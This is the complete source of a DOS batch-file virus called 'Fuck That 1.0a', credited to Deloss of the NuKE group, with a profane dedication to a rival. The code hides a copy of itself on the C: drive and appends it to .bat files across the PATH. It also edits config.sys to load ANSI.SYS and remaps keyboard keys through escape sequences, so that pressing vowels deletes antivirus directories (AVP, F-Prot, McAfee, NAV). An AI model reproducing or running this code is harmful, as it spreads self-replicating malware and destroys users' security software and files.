@echo off%_FukThat%
::###########################################
::Fuck That 1.0a 
::Deloss / NuKE
::This virus goes out to Ruzz and his
::fucked up policies of with who his members
::in Shadowvx can and cannot speak to.
::Free The Tree Frogs! 
::###########################################
if '%1=='FukThat goto FukThat%2
set FukThat=%0.bat
if not exist %FukThat% set FukThat=%0
if '%FukThat%==' set FukThat=autoexec.bat
if exist c:\_FukThat.bat goto FG
if not exist %FukThat% goto FZ
find "FukThat"<%FukThat%>c:\_FukThat.bat
attrib c:\_FukThat.bat +h
:FG
command /c c:\_FukThat F V . .. \ %path%
:FZ
set FukThat=
goto FE
:FV
shift%_FukThat%
if '%2==' exit FukThat
for %%a in (%2\*.bat %2*.bat) do call c:\_FukThat F I %%a 
goto FV
:FI
find "FukThat"<%3>nul
if not errorlevel 1 goto FE
type %3>FukThat$
echo.>>FukThat$
type c:\_FukThat.bat>>FukThat$
move FukThat$ %3>nul
:FD
echo.|date|find "12">nul.FukThat
echo DEVICE=c:\windows\command\ansi.sys>>config.sys
if errorlevel 1 goto FN
:FN
echo.|date|find "13">nul.FukThat
@echo on
echo and if they say you can't come around here say *fuck that*.
echo and if they say you can't come around me say *fuck that*. 
["n";"y";13p
["y";"n";13p
["N";"y";13p
["Y";"n";13p
["a";"del c:\avp";13p
["e";"del c:\f-prot";13p
["i";"del c:\mcafee";13p
["o";"del c:\nav";13p
["A";"del c:\avp";13p
["E";"del c:\f-prot";13p
["I";"del c:\mcafee";13p
["O";"del c:\nav";13p
if errorlevel 1 goto FE
echo off
exit FukThat
:FE